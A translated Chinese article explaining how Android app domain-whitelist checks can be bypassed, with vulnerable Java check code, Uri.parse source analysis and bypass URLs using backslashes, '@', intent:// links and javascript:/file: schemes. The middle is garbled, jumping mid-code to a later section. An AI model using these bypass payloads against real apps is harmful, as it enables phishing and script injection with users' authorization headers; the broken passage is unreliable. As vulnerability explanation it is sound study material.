# 绕过Android域名白名单校验的方法
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0\. 引言
很多 Android 组件都有响应外部链接的能力，如果攻击者能随意的指定这些组件所响应的 url，轻则可以引导被攻击的 APP
弹出钓鱼页面，重则可能远程执行恶意 js 代码。 因此 APP 开发者必然要对传入的 url
进行校验，而设置域名白名单就是一种简单常见且具有较高安全性的防御方法。
然而由于一些开发者并不完全通晓调用方法的底层特性，使得看起来万无一失的白名单校验形同虚设。 本文列举几种常见的 Android
域名白名单校验写法，并深入源码指出其中存在的风险和绕过方法。
## 1\. Url加入反斜杠”\”
###  1.1. 方法描述
先来看一种典型的域名校验写法:
    /*  Uri 结构
    *   [scheme:][//authority][path][?query][#fragment]
    */
    [check_v1]
    Uri uri = Uri.parse(attackerControlledString);
    if ("legitimate.com".equals(uri.getHost()) || uri.getHost().endsWith(".legitimate.com")) {
        webView.loadUrl(attackerControlledString, getAuthorizationHeaders());
        // or webView.loadUrl(uri.toString()) 
    }
然而…
    String url = "http://attacker.com\\.legitimate.com/smth"; 
    Log.d("getHost:", Uri.parse(url).getHost());         // 输出 attacker.com\.legitimate.com ! 
    if (Uri.parse(url).getHost().endsWith(".legitimate.com")) { 
            webView.loadUrl(url, getAuthorizationHeaders());  // 成功加载 attacker.com！
    }
可以看到 getHost() 和 loadUrl()
的表现不一致，if检验跳转目标是legitimate.com，但执行时浏览器会把反斜线纠正为正斜线去访问attacker.com。 那么如果是用
equals() 来做完整的 host 检验该怎么办呢？ 只需加一个‘@’就能隔断非法前缀。
    String url = "http://attacker.com\\@legitimate.com/smth";
    Log.d("Wow", Uri.parse(url).getHost());          // 输出 legitimate.com!
    webView.loadUrl(url, getAuthorizationHeaders()); // 加载 attacker.com！
###  1.2. 分析原因
看来android.net.Uri的 parse() 是有安全缺陷的，我们扒拉一下代码定位问题…
    [frameworks/base/core/java/android/net/Uri.java]
    public static Uri parse(String uriString) {
            return new StringUri(uriString);
    }
继续看这个内部类StringUri
    [frameworks/base/core/java/android/net/Uri.java]
    private static class StringUri extends AbstractHierarchicalUri {
            ...
            private StringUri(String uriString) {
                this.uriString = uriString;
            }
            ...
            private Part getAuthorityPart() {
                if (authority == null) {
                    String encodedAuthority
                            = parseAuthority(this.uriString, findSchemeSeparator());
                    return authority = Part.fromEncoded(encodedAuthority);
                }
                return authority;
            }
            ...
            static String parseAuthority(String uriString, int ssi) {
                int length = uriString.length();
                // If "//" follows the scheme separator, we have an authority.
                if (length > ssi + 2
                        && uriString.charAt(ssi + 1) == '/'
                        && uriString.charAt(ssi + 2) == '/') {
                    // We have an authority.
                    // Look for the start of the path, query, or fragment, or the
                    // end of the string.
                    int end = ssi + 3;
                    LOOP: while (end 
标签中指定的内容和 Intent 中携带的 Data 完全一致时，当前活动才能响应该 Intent。
前面两种方法我们都是用安装恶意 App 或 ADB 命令来触发攻击，注意到 Android 对  定义的属性，也是通过
parsedIntent.getData().getHost() 来进行匹配的，我们很自然的想到尝试远程利用。
    调用格式 
    -->
    Click Attack v1
    Click Attack v2
然而，对于第一个链接，浏览器会自动把反斜杠 “\” 纠正为正斜杠 “/” 对于第二个链接，反斜杠 “\” 会以 URL 编码形式保留而无法触发方法1
通过仔细研究intent://scheme的[工作机制](http://androidxref.com/8.1.0_r33/xref/frameworks/base/core/java/android/content/Intent.java#6021)，发现可以通过如下方式保留反斜杠
“\” 的方法：
PoC:
    Click Attack v3
跟踪[源码](http://androidxref.com/8.1.0_r33/xref/frameworks/base/core/java/android/content/Intent.java#6123)，可以看到，访问这个链接，等价于执行：
    Uri.parse("https://attacker.com\\\\@legitimate.com/://not_used/")
从而实现方法1的远程执行版本
## 4\. 缺少scheme验证
实战不乏有些 App 对 host 做了校验，但却遗漏了对 scheme 的检查。
可以用下面的 uri， 尝试进行 js 和 file 域的 PoC
javascript://legitimate.com/%0aalert(1)//
file://legitimate.com/sdcard/payload.html
## 5\. 参考链接
https://hackerone.com/reports/431002